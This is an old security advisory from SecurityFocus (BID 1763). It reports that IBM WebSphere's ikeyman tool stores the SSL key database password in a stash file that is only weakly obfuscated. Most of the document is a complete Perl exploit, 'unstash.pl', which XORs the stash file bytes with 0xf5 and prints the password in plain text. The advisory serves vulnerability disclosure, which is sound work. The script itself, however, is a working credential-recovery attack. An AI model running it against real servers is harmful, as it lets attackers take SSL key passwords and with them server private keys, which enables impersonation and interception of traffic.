source: http://www.securityfocus.com/bid/1763/info


IBM WebSphere ships with a tool called 'ikeyman' that encrypts server certificates/key pairs when the IBM HTTP Server and SSL connections are enabled. Ikeyman stores the password in a stash file which can be easily decrypted through the use of a freely available script

#!/usr/bin/perl -w
#
# unstash.pl - "decrypt" IBM HTTP server stash files. No, really. They
*are* this pathetic.
#
# sploit (BoByRiTe) 1999, Major Malfunction, code by Ben Laurie, cos I
dudn't dud perly thing.

use strict;

die "Usage: $0 <stash file>\n" if $#ARGV != 0;

my $file=$ARGV[0];
open(F,$file) || die "Can't open $file: $!";

my $stash;
read F,$stash,1024;

my @unstash=map { $_^0xf5 } unpack("C*",$stash);

foreach my $c (@unstash) {
    last if $c eq 0;
    printf "%c",$c;
}
printf "\n";